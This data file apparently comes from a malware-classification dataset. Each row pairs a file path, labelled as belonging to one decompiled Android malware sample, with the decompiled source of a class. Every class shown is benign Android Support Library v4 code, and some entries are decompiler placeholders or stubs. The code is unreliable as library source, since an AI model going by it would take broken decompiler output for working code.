"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\WakefulBroadcastReceiver.code","public abstract class WakefulBroadcastReceiver extends BroadcastReceiver {   private static final String EXTRA_WAKE_LOCK_ID=""android.support.content.wakelockid"";   private static final SparseArray<PowerManager.WakeLock> mActiveWakeLocks=new SparseArray<>();   private static int mNextId=1;   public static ComponentName startWakefulService(  Context context,  Intent intent){     ComponentName comp; synchronized (mActiveWakeLocks) {       int id=mNextId;       mNextId++;       if (mNextId <= 0) {         mNextId=1;       }       intent.putExtra(EXTRA_WAKE_LOCK_ID,id);       comp=context.startService(intent);       if (comp == null) {         comp=null;       }  else {         PowerManager pm=(PowerManager)context.getSystemService(""power"");         PowerManager.WakeLock wl=pm.newWakeLock(1,""wake:"" + comp.flattenToShortString());         wl.setReferenceCounted(false);         wl.acquire(60000L);         mActiveWakeLocks.put(id,wl);       }     }     return comp;   }   public static boolean completeWakefulIntent(  Intent intent){     boolean z=false;     int id=intent.getIntExtra(EXTRA_WAKE_LOCK_ID,0);     if (id != 0) { synchronized (mActiveWakeLocks) {         PowerManager.WakeLock wl=mActiveWakeLocks.get(id);         if (wl != null) {           wl.release();           mActiveWakeLocks.remove(id);           z=true;         }  else {           Log.w(""WakefulBroadcastReceiver"",""No active wake lock id #"" + id);           z=true;         }       }     }     return z;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content\WorkerRunnable.code","public static abstract class WorkerRunnable<Params,Result> implements Callable<Result> {   Params[] mParams;   private WorkerRunnable(){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.content.pm\ActivityInfoCompat.code","public class ActivityInfoCompat {   public static final int CONFIG_UI_MODE=512;   private ActivityInfoCompat(){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.database\DatabaseUtilsCompat.code","public class DatabaseUtilsCompat {   private DatabaseUtilsCompat(){   }   public static String concatenateWhere(  String a,  String b){     if (TextUtils.isEmpty(a)) {       return b;     }     return TextUtils.isEmpty(b) ? a : ""("" + a + "") AND (""+ b+ "")"";   }   public static String[] appendSelectionArgs(  String[] originalValues,  String[] newValues){     if (originalValues == null || originalValues.length == 0) {       return newValues;     }     String[] result=new String[originalValues.length + newValues.length];     System.arraycopy(originalValues,0,result,0,originalValues.length);     System.arraycopy(newValues,0,result,originalValues.length,newValues.length);     return result;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.graphics.drawable\BaseDrawableImpl.code","static class BaseDrawableImpl implements DrawableImpl {   BaseDrawableImpl(){   }   @Override public void jumpToCurrentState(  Drawable drawable){   }   @Override public void setAutoMirrored(  Drawable drawable,  boolean mirrored){   }   @Override public boolean isAutoMirrored(  Drawable drawable){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.graphics.drawable\DrawableCompat.code","public class DrawableCompat {   static final DrawableImpl IMPL; interface DrawableImpl {     boolean isAutoMirrored(    Drawable drawable);     void jumpToCurrentState(    Drawable drawable);     void setAutoMirrored(    Drawable drawable,    boolean z);   } static class BaseDrawableImpl implements DrawableImpl {     BaseDrawableImpl(){     }     @Override public void jumpToCurrentState(    Drawable drawable){     }     @Override public void setAutoMirrored(    Drawable drawable,    boolean mirrored){     }     @Override public boolean isAutoMirrored(    Drawable drawable){       return false;     }   } static class HoneycombDrawableImpl extends BaseDrawableImpl {     HoneycombDrawableImpl(){     }     @Override public void jumpToCurrentState(    Drawable drawable){       DrawableCompatHoneycomb.jumpToCurrentState(drawable);     }   } static class KitKatDrawableImpl extends HoneycombDrawableImpl {     KitKatDrawableImpl(){     }     @Override public void setAutoMirrored(    Drawable drawable,    boolean mirrored){       DrawableCompatKitKat.setAutoMirrored(drawable,mirrored);     }     @Override public boolean isAutoMirrored(    Drawable drawable){       return DrawableCompatKitKat.isAutoMirrored(drawable);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatDrawableImpl();     }  else     if (version >= 11) {       IMPL=new HoneycombDrawableImpl();     }  else {       IMPL=new BaseDrawableImpl();     }   }   public static void jumpToCurrentState(  Drawable drawable){     IMPL.jumpToCurrentState(drawable);   }   public static void setAutoMirrored(  Drawable drawable,  boolean mirrored){     IMPL.setAutoMirrored(drawable,mirrored);   }   public static boolean isAutoMirrored(  Drawable drawable){     return IMPL.isAutoMirrored(drawable);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.graphics.drawable\DrawableCompatHoneycomb.code","class DrawableCompatHoneycomb {   DrawableCompatHoneycomb(){   }   public static void jumpToCurrentState(  Drawable drawable){     drawable.jumpToCurrentState();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.graphics.drawable\DrawableCompatKitKat.code","class DrawableCompatKitKat {   DrawableCompatKitKat(){   }   public static void setAutoMirrored(  Drawable drawable,  boolean mirrored){     drawable.setAutoMirrored(mirrored);   }   public static boolean isAutoMirrored(  Drawable drawable){     return drawable.isAutoMirrored();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.graphics.drawable\DrawableImpl.code","interface DrawableImpl {   boolean isAutoMirrored(  Drawable drawable);   void jumpToCurrentState(  Drawable drawable);   void setAutoMirrored(  Drawable drawable,  boolean z); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.graphics.drawable\HoneycombDrawableImpl.code","static class HoneycombDrawableImpl extends BaseDrawableImpl {   HoneycombDrawableImpl(){   }   @Override public void jumpToCurrentState(  Drawable drawable){     DrawableCompatHoneycomb.jumpToCurrentState(drawable);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.graphics.drawable\KitKatDrawableImpl.code","static class KitKatDrawableImpl extends HoneycombDrawableImpl {   KitKatDrawableImpl(){   }   @Override public void setAutoMirrored(  Drawable drawable,  boolean mirrored){     DrawableCompatKitKat.setAutoMirrored(drawable,mirrored);   }   @Override public boolean isAutoMirrored(  Drawable drawable){     return DrawableCompatKitKat.isAutoMirrored(drawable);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.hardware.display\DisplayManagerCompat.code","public abstract class DisplayManagerCompat {   public static final String DISPLAY_CATEGORY_PRESENTATION=""android.hardware.display.category.PRESENTATION"";   private static final WeakHashMap<Context,DisplayManagerCompat> sInstances=new WeakHashMap<>();   public abstract Display getDisplay(  int i);   public abstract Display[] getDisplays();   public abstract Display[] getDisplays(  String str);   DisplayManagerCompat(){   }   public static DisplayManagerCompat getInstance(  Context context){     DisplayManagerCompat instance; synchronized (sInstances) {       instance=sInstances.get(context);       if (instance == null) {         int version=Build.VERSION.SDK_INT;         if (version >= 17) {           instance=new JellybeanMr1Impl(context);         }  else {           instance=new LegacyImpl(context);         }         sInstances.put(context,instance);       }     }     return instance;   } private static class LegacyImpl extends DisplayManagerCompat {     private final WindowManager mWindowManager;     public LegacyImpl(    Context context){       this.mWindowManager=(WindowManager)context.getSystemService(""window"");     }     @Override public Display getDisplay(    int displayId){       Display display=this.mWindowManager.getDefaultDisplay();       if (display.getDisplayId() == displayId) {         return display;       }       return null;     }     @Override public Display[] getDisplays(){       return new Display[]{this.mWindowManager.getDefaultDisplay()};     }     @Override public Display[] getDisplays(    String category){       return category == null ? getDisplays() : new Display[0];     }   } private static class JellybeanMr1Impl extends DisplayManagerCompat {     private final Object mDisplayManagerObj;     public JellybeanMr1Impl(    Context context){       this.mDisplayManagerObj=DisplayManagerJellybeanMr1.getDisplayManager(context);     }     @Override public Display getDisplay(    int displayId){       return DisplayManagerJellybeanMr1.getDisplay(this.mDisplayManagerObj,displayId);     }     @Override public Display[] getDisplays(){       return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj);     }     @Override public Display[] getDisplays(    String category){       return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj,category);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.hardware.display\DisplayManagerJellybeanMr1.code","final class DisplayManagerJellybeanMr1 {   DisplayManagerJellybeanMr1(){   }   public static Object getDisplayManager(  Context context){     return context.getSystemService(""display"");   }   public static Display getDisplay(  Object displayManagerObj,  int displayId){     return ((DisplayManager)displayManagerObj).getDisplay(displayId);   }   public static Display[] getDisplays(  Object displayManagerObj){     return ((DisplayManager)displayManagerObj).getDisplays();   }   public static Display[] getDisplays(  Object displayManagerObj,  String category){     return ((DisplayManager)displayManagerObj).getDisplays(category);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.hardware.display\JellybeanMr1Impl.code","private static class JellybeanMr1Impl extends DisplayManagerCompat {   private final Object mDisplayManagerObj;   public JellybeanMr1Impl(  Context context){     this.mDisplayManagerObj=DisplayManagerJellybeanMr1.getDisplayManager(context);   }   @Override public Display getDisplay(  int displayId){     return DisplayManagerJellybeanMr1.getDisplay(this.mDisplayManagerObj,displayId);   }   @Override public Display[] getDisplays(){     return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj);   }   @Override public Display[] getDisplays(  String category){     return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj,category);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.hardware.display\LegacyImpl.code","private static class LegacyImpl extends DisplayManagerCompat {   private final WindowManager mWindowManager;   public LegacyImpl(  Context context){     this.mWindowManager=(WindowManager)context.getSystemService(""window"");   }   @Override public Display getDisplay(  int displayId){     Display display=this.mWindowManager.getDefaultDisplay();     if (display.getDisplayId() == displayId) {       return display;     }     return null;   }   @Override public Display[] getDisplays(){     return new Display[]{this.mWindowManager.getDefaultDisplay()};   }   @Override public Display[] getDisplays(  String category){     return category == null ? getDisplays() : new Display[0];   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.internal.view\SupportMenu.code","public interface SupportMenu extends Menu {   public static final int CATEGORY_MASK=-65536;   public static final int CATEGORY_SHIFT=16;   public static final int USER_MASK=65535;   public static final int USER_SHIFT=0; } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.internal.view\SupportMenuItem.code","public interface SupportMenuItem extends MenuItem {   public static final int SHOW_AS_ACTION_ALWAYS=2;   public static final int SHOW_AS_ACTION_COLLAPSE_ACTION_VIEW=8;   public static final int SHOW_AS_ACTION_IF_ROOM=1;   public static final int SHOW_AS_ACTION_NEVER=0;   public static final int SHOW_AS_ACTION_WITH_TEXT=4;   @Override boolean collapseActionView();   @Override boolean expandActionView();   @Override View getActionView();   ActionProvider getSupportActionProvider();   @Override boolean isActionViewExpanded();   @Override MenuItem setActionView(  int i);   @Override MenuItem setActionView(  View view);   @Override void setShowAsAction(  int i);   @Override MenuItem setShowAsActionFlags(  int i);   SupportMenuItem setSupportActionProvider(  ActionProvider actionProvider);   SupportMenuItem setSupportOnActionExpandListener(  MenuItemCompat.OnActionExpandListener onActionExpandListener); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.internal.view\SupportSubMenu.code","public interface SupportSubMenu extends SupportMenu, SubMenu { } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.media\TransportController.code","public abstract class TransportController {   public abstract int getBufferPercentage();   public abstract long getCurrentPosition();   public abstract long getDuration();   public abstract int getTransportControlFlags();   public abstract boolean isPlaying();   public abstract void pausePlaying();   public abstract void registerStateListener(  TransportStateListener transportStateListener);   public abstract void seekTo(  long j);   public abstract void startPlaying();   public abstract void stopPlaying();   public abstract void unregisterStateListener(  TransportStateListener transportStateListener); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.media\TransportMediator.code","!org.eclipse.jdt.core.dom.TypeDeclaration@41df222e"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.media\TransportMediatorCallback.code","interface TransportMediatorCallback {   long getPlaybackPosition();   void handleAudioFocusChange(  int i);   void handleKey(  KeyEvent keyEvent);   void playbackPositionUpdate(  long j); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.media\TransportMediatorJellybeanMR2.code","class TransportMediatorJellybeanMR2 implements RemoteControlClient.OnGetPlaybackPositionListener, RemoteControlClient.OnPlaybackPositionUpdateListener {   boolean mAudioFocused;   final AudioManager mAudioManager;   final Context mContext;   boolean mFocused;   final Intent mIntent;   PendingIntent mPendingIntent;   final String mReceiverAction;   final IntentFilter mReceiverFilter;   RemoteControlClient mRemoteControl;   final View mTargetView;   final TransportMediatorCallback mTransportCallback;   final ViewTreeObserver.OnWindowAttachListener mWindowAttachListener=new ViewTreeObserver.OnWindowAttachListener(){     @Override public void onWindowAttached(){       TransportMediatorJellybeanMR2.this.windowAttached();     }     @Override public void onWindowDetached(){       TransportMediatorJellybeanMR2.this.windowDetached();     }   } ;   final ViewTreeObserver.OnWindowFocusChangeListener mWindowFocusListener=new ViewTreeObserver.OnWindowFocusChangeListener(){     @Override public void onWindowFocusChanged(    boolean hasFocus){       if (!hasFocus) {         TransportMediatorJellybeanMR2.this.loseFocus();       }  else {         TransportMediatorJellybeanMR2.this.gainFocus();       }     }   } ;   final BroadcastReceiver mMediaButtonReceiver=new BroadcastReceiver(){     @Override public void onReceive(    Context context,    Intent intent){       try {         KeyEvent event=(KeyEvent)intent.getParcelableExtra(""android.intent.extra.KEY_EVENT"");         TransportMediatorJellybeanMR2.this.mTransportCallback.handleKey(event);       }  catch (      ClassCastException e) {         Log.w(""TransportController"",e);       }     }   } ;   AudioManager.OnAudioFocusChangeListener mAudioFocusChangeListener=new AudioManager.OnAudioFocusChangeListener(){     @Override public void onAudioFocusChange(    int focusChange){       TransportMediatorJellybeanMR2.this.mTransportCallback.handleAudioFocusChange(focusChange);     }   } ;   int mPlayState=0;   public TransportMediatorJellybeanMR2(  Context context,  AudioManager audioManager,  View view,  TransportMediatorCallback transportCallback){     this.mContext=context;     this.mAudioManager=audioManager;     this.mTargetView=view;     this.mTransportCallback=transportCallback;     this.mReceiverAction=context.getPackageName() + "":transport:"" + System.identityHashCode(this);     this.mIntent=new Intent(this.mReceiverAction);     this.mIntent.setPackage(context.getPackageName());     this.mReceiverFilter=new IntentFilter();     this.mReceiverFilter.addAction(this.mReceiverAction);     this.mTargetView.getViewTreeObserver().addOnWindowAttachListener(this.mWindowAttachListener);     this.mTargetView.getViewTreeObserver().addOnWindowFocusChangeListener(this.mWindowFocusListener);   }   public Object getRemoteControlClient(){     return this.mRemoteControl;   }   public void destroy(){     windowDetached();     this.mTargetView.getViewTreeObserver().removeOnWindowAttachListener(this.mWindowAttachListener);     this.mTargetView.getViewTreeObserver().removeOnWindowFocusChangeListener(this.mWindowFocusListener);   }   void windowAttached(){     this.mContext.registerReceiver(this.mMediaButtonReceiver,this.mReceiverFilter);     this.mPendingIntent=PendingIntent.getBroadcast(this.mContext,0,this.mIntent,268435456);     this.mRemoteControl=new RemoteControlClient(this.mPendingIntent);     this.mRemoteControl.setOnGetPlaybackPositionListener(this);     this.mRemoteControl.setPlaybackPositionUpdateListener(this);   }   void gainFocus(){     if (!this.mFocused) {       this.mFocused=true;       this.mAudioManager.registerMediaButtonEventReceiver(this.mPendingIntent);       this.mAudioManager.registerRemoteControlClient(this.mRemoteControl);       if (this.mPlayState == 3) {         takeAudioFocus();       }     }   }   void takeAudioFocus(){     if (!this.mAudioFocused) {       this.mAudioFocused=true;       this.mAudioManager.requestAudioFocus(this.mAudioFocusChangeListener,3,1);     }   }   public void startPlaying(){     if (this.mPlayState != 3) {       this.mPlayState=3;       this.mRemoteControl.setPlaybackState(3);     }     if (this.mFocused) {       takeAudioFocus();     }   }   @Override public long onGetPlaybackPosition(){     return this.mTransportCallback.getPlaybackPosition();   }   @Override public void onPlaybackPositionUpdate(  long newPositionMs){     this.mTransportCallback.playbackPositionUpdate(newPositionMs);   }   public void refreshState(  boolean playing,  long position,  int transportControls){     if (this.mRemoteControl != null) {       this.mRemoteControl.setPlaybackState(playing ? 3 : 1,position,playing ? 1.0f : 0.0f);       this.mRemoteControl.setTransportControlFlags(transportControls);     }   }   public void pausePlaying(){     if (this.mPlayState == 3) {       this.mPlayState=2;       this.mRemoteControl.setPlaybackState(2);     }     dropAudioFocus();   }   public void stopPlaying(){     if (this.mPlayState != 1) {       this.mPlayState=1;       this.mRemoteControl.setPlaybackState(1);     }     dropAudioFocus();   }   void dropAudioFocus(){     if (this.mAudioFocused) {       this.mAudioFocused=false;       this.mAudioManager.abandonAudioFocus(this.mAudioFocusChangeListener);     }   }   void loseFocus(){     dropAudioFocus();     if (this.mFocused) {       this.mFocused=false;       this.mAudioManager.unregisterRemoteControlClient(this.mRemoteControl);       this.mAudioManager.unregisterMediaButtonEventReceiver(this.mPendingIntent);     }   }   void windowDetached(){     loseFocus();     if (this.mPendingIntent != null) {       this.mContext.unregisterReceiver(this.mMediaButtonReceiver);       this.mPendingIntent.cancel();       this.mPendingIntent=null;       this.mRemoteControl=null;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.media\TransportPerformer.code","public abstract class TransportPerformer {   static final int AUDIOFOCUS_GAIN=1;   static final int AUDIOFOCUS_GAIN_TRANSIENT=2;   static final int AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK=3;   static final int AUDIOFOCUS_LOSS=-1;   static final int AUDIOFOCUS_LOSS_TRANSIENT=-2;   static final int AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK=-3;   public abstract long onGetCurrentPosition();   public abstract long onGetDuration();   public abstract boolean onIsPlaying();   public abstract void onPause();   public abstract void onSeekTo(  long j);   public abstract void onStart();   public abstract void onStop();   public int onGetBufferPercentage(){     return 100;   }   public int onGetTransportControlFlags(){     return 60;   }   public boolean onMediaButtonDown(  int r3,  android.view.KeyEvent r4){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.media.TransportPerformer.onMediaButtonDown(int, android.view.KeyEvent):boolean"");   }   public boolean onMediaButtonUp(  int keyCode,  KeyEvent event){     return true;   }   public void onAudioFocusChange(  int focusChange){     int keyCode=0; switch (focusChange) { case -1:       keyCode=TransportMediator.KEYCODE_MEDIA_PAUSE;     break; } if (keyCode != 0) {   long now=SystemClock.uptimeMillis();   onMediaButtonDown(keyCode,new KeyEvent(now,now,0,keyCode,0));   onMediaButtonUp(keyCode,new KeyEvent(now,now,1,keyCode,0)); } } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.media\TransportStateListener.code","public class TransportStateListener {   public void onPlayingChanged(  TransportController controller){   }   public void onTransportControlsChanged(  TransportController controller){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\BaseConnectivityManagerCompatImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6546f3f0"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\BaseTrafficStatsCompatImpl.code","static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){     @Override public SocketTags initialValue(){       return new SocketTags();     }   } ; public static class SocketTags {     public int statsTag;     private SocketTags(){       this.statsTag=-1;     }   }   BaseTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     this.mThreadSocketTags.get().statsTag=-1;   }   @Override public int getThreadStatsTag(){     return this.mThreadSocketTags.get().statsTag;   }   @Override public void incrementOperationCount(  int operationCount){   }   @Override public void incrementOperationCount(  int tag,  int operationCount){   }   @Override public void setThreadStatsTag(  int tag){     this.mThreadSocketTags.get().statsTag=tag;   }   @Override public void tagSocket(  Socket socket){   }   @Override public void untagSocket(  Socket socket){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\ConnectivityManagerCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@67652bd6"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\ConnectivityManagerCompatGingerbread.code","!org.eclipse.jdt.core.dom.TypeDeclaration@32c433cd"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\ConnectivityManagerCompatHoneycombMR2.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6b99f464"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\ConnectivityManagerCompatImpl.code","interface ConnectivityManagerCompatImpl {   boolean isActiveNetworkMetered(  ConnectivityManager connectivityManager); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\ConnectivityManagerCompatJellyBean.code","class ConnectivityManagerCompatJellyBean {   ConnectivityManagerCompatJellyBean(){   }   public static boolean isActiveNetworkMetered(  ConnectivityManager cm){     return cm.isActiveNetworkMetered();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\GingerbreadConnectivityManagerCompatImpl.code","static class GingerbreadConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   GingerbreadConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatGingerbread.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\HoneycombMR2ConnectivityManagerCompatImpl.code","static class HoneycombMR2ConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   HoneycombMR2ConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatHoneycombMR2.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\IcsTrafficStatsCompatImpl.code","static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {   IcsTrafficStatsCompatImpl(){   }   @Override public void clearThreadStatsTag(){     TrafficStatsCompatIcs.clearThreadStatsTag();   }   @Override public int getThreadStatsTag(){     return TrafficStatsCompatIcs.getThreadStatsTag();   }   @Override public void incrementOperationCount(  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(operationCount);   }   @Override public void incrementOperationCount(  int tag,  int operationCount){     TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);   }   @Override public void setThreadStatsTag(  int tag){     TrafficStatsCompatIcs.setThreadStatsTag(tag);   }   @Override public void tagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.tagSocket(socket);   }   @Override public void untagSocket(  Socket socket) throws SocketException {     TrafficStatsCompatIcs.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\JellyBeanConnectivityManagerCompatImpl.code","static class JellyBeanConnectivityManagerCompatImpl implements ConnectivityManagerCompatImpl {   JellyBeanConnectivityManagerCompatImpl(){   }   @Override public boolean isActiveNetworkMetered(  ConnectivityManager cm){     return ConnectivityManagerCompatJellyBean.isActiveNetworkMetered(cm);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\SocketTags.code","public static class SocketTags {   public int statsTag;   private SocketTags(){     this.statsTag=-1;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\TrafficStatsCompat.code","public class TrafficStatsCompat {   private static final TrafficStatsCompatImpl IMPL; interface TrafficStatsCompatImpl {     void clearThreadStatsTag();     int getThreadStatsTag();     void incrementOperationCount(    int i);     void incrementOperationCount(    int i,    int i2);     void setThreadStatsTag(    int i);     void tagSocket(    Socket socket) throws SocketException ;     void untagSocket(    Socket socket) throws SocketException ;   } static class BaseTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     private ThreadLocal<SocketTags> mThreadSocketTags=new ThreadLocal<SocketTags>(){       @Override public SocketTags initialValue(){         return new SocketTags();       }     } ; public static class SocketTags {       public int statsTag;       private SocketTags(){         this.statsTag=-1;       }     }     BaseTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       this.mThreadSocketTags.get().statsTag=-1;     }     @Override public int getThreadStatsTag(){       return this.mThreadSocketTags.get().statsTag;     }     @Override public void incrementOperationCount(    int operationCount){     }     @Override public void incrementOperationCount(    int tag,    int operationCount){     }     @Override public void setThreadStatsTag(    int tag){       this.mThreadSocketTags.get().statsTag=tag;     }     @Override public void tagSocket(    Socket socket){     }     @Override public void untagSocket(    Socket socket){     }   } static class IcsTrafficStatsCompatImpl implements TrafficStatsCompatImpl {     IcsTrafficStatsCompatImpl(){     }     @Override public void clearThreadStatsTag(){       TrafficStatsCompatIcs.clearThreadStatsTag();     }     @Override public int getThreadStatsTag(){       return TrafficStatsCompatIcs.getThreadStatsTag();     }     @Override public void incrementOperationCount(    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(operationCount);     }     @Override public void incrementOperationCount(    int tag,    int operationCount){       TrafficStatsCompatIcs.incrementOperationCount(tag,operationCount);     }     @Override public void setThreadStatsTag(    int tag){       TrafficStatsCompatIcs.setThreadStatsTag(tag);     }     @Override public void tagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.tagSocket(socket);     }     @Override public void untagSocket(    Socket socket) throws SocketException {       TrafficStatsCompatIcs.untagSocket(socket);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new IcsTrafficStatsCompatImpl();     }  else {       IMPL=new BaseTrafficStatsCompatImpl();     }   }   public static void clearThreadStatsTag(){     IMPL.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return IMPL.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     IMPL.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     IMPL.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     IMPL.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     IMPL.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     IMPL.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\TrafficStatsCompatIcs.code","class TrafficStatsCompatIcs {   TrafficStatsCompatIcs(){   }   public static void clearThreadStatsTag(){     TrafficStats.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return TrafficStats.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     TrafficStats.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     TrafficStats.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     TrafficStats.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     TrafficStats.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     TrafficStats.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.net\TrafficStatsCompatImpl.code","interface TrafficStatsCompatImpl {   void clearThreadStatsTag();   int getThreadStatsTag();   void incrementOperationCount(  int i);   void incrementOperationCount(  int i,  int i2);   void setThreadStatsTag(  int i);   void tagSocket(  Socket socket) throws SocketException ;   void untagSocket(  Socket socket) throws SocketException ; } "
